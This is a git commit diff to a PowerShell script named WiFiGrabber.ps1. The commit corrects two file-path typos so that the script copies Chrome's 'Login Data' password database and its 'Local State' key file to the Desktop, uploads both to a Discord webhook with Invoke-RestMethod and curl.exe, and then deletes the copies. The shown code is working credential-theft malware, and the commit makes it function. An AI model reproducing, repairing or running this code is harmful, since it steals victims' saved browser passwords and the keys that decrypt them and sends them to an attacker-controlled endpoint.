de4520e29ab2bbf03310a1ba2b548fcdc5042e94
iproUA <160288191+iproUA@users.noreply.github.com>
2024-02-17 03:38:29 +0100

    Update WiFiGrabber.ps1

--- WiFiGrabber.ps1
+++ WiFiGrabber.ps1
@@ -41,12 +41,12 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
-$sourceFile1 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Lin Data";
+$sourceFile1 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data";
 $outputFile1 = "$([System.Environment]::GetFolderPath('Desktop'))\output.txt";
 Copy-Item $sourceFile1 $outputFile1;
 Upload-Discord -file $outputFile1 -text ":)";
 Remove-Item $outputFile1;
-$sourceFile2 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Lal State";
+$sourceFile2 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State";
 $outputFile2 = "$([System.Environment]::GetFolderPath('Desktop'))\key.txt";
 Copy-Item $sourceFile2 $outputFile2;
 Upload-Discord -file $outputFile2 -text "Key-File"; 
